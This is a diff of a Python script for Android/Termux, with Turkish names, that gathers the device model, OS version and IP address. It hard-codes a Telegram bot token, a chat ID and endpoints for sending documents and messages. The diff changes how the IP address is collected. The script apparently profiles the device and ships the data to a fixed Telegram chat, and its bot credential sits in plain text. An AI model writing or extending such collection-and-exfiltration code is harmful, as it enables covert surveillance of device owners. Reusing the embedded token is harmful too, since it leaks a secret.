@@ -7,7 +7,7 @@ from telegram.ext import Updater, CommandHandler
 
 # Telegram Bot Ayarları
 BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
-CHAT_ID = "6736473228"  # Yeni chat ID
+CHAT_ID = "6736473228"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
 TELEGRAM_MESSAGE_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
@@ -19,8 +19,15 @@ def cihaz_bilgisi_al():
     try:
         bilgiler["Model"] = os.popen("getprop ro.product.model").read().strip()
         bilgiler["OS"] = os.popen("getprop ro.build.version.release").read().strip()
-        bilgiler["IP"] = os.popen("ip addr show wlan0 | grep inet").read().split()[1].split('/')[0]
-        bilgiler["Batarya"] = os.popen("termux-battery-status").read().strip() or "Bilinmiyor"
+        # IP alma: Önce ip route, sonra ifconfig dene
+        try:
+            ip_cikti = os.popen("ip route get 8.8.8.8").read()
+            ip = [line for line in ip_cikti.splitlines() if "src" in line]
+            bilgiler["IP"] = ip[0].split("src")[1].split()[0] if ip else "Bilinmiyor"
+        except:
+            ip_cikti = os.popen("ifconfig wlan0").read()
+            ip = [line for line in ip_cikti.splitlines() if "inet addr" in line]
+            bilgiler["IP"] = ip[0].split("inet addr:")[1].split()[0] if ip else "Bilinmiyor"
     except:
         bilgiler["Hata"] = "Bazı bilgiler alınamadı!"
     return bilgiler
